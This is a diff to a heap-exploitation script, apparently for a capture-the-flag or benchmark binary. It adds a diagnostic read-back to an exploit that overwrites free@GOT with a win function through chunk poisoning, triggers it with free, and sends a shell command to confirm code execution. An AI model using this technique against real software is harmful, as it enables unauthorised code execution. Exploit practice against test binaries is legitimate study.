@@ -95,8 +95,15 @@ try:
         choose(io, 1, 2); stage = "malloc1"; dbg += drain()         # malloc -> chunk 0
         choose(io, 1, 3); stage = "malloc2"; dbg += drain()         # malloc -> free@GOT
         choose(io, 3, 3, p64(win)); stage = "wrote_win"; dbg += drain()   # *free@GOT = win (8 bytes)
+        # DIAG: read chunks[3][:8] back. If == win, the arbitrary write landed on free@GOT (so the
+        # poison worked and the failure is the free->win jump); if not, malloc2 did not yield free@GOT.
+        wrote = 0
+        try:
+            choose(io, 4, 3); wrote = u64(io.recv(8).ljust(8, b"\x00"))
+        except Exception:
+            pass
         io.sendlineafter(PROMPT, b"2"); io.sendline(b"2")           # free(2) -> free@GOT -> win()
-        stage = "triggered"; dbg += io.recvrepeat(1.5)
+        stage = "triggered"; dbg += b" wrote_back=%#x " % wrote; dbg += io.recvrepeat(1.5)
         io.sendline(b"echo BINORACLE_PWNED; id"); dbg += io.recvrepeat(1.5)
     except Exception as e:
         dbg += ("[EOF@%s:%r]" % (stage, str(e))).encode()
